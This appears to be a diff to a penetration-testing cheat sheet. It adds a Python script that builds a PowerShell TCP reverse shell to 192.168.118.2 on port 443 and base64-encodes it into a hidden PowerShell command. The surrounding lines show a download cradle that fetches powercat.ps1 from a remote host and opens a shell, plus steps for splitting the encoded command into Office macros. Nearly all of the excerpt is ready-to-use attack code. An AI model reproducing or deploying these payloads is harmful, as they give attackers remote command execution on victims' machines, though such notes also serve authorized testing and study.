@@ -51,6 +51,21 @@ System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powerc
 192.168.119.3 -p 4444 -e powershell
 ```
 
+```POWERSHELL
+import sys
+import base64
+payload = '$client = New-Object 
+System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = 
+$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, 
+$bytes.Length)) -ne 0){;$data = (New-Object -TypeName 
+System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | OutString );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = 
+([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
+th);$stream.Flush()};$client.Close()'
+cmd = "powershell -nop -w hidden -e " + 
+base64.b64encode(payload.encode('utf16')[2:]).decode()
+print(cmd)
+```
+
 ###### Split above powershell command into chunks to be used by macros.
 ```Python
 str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
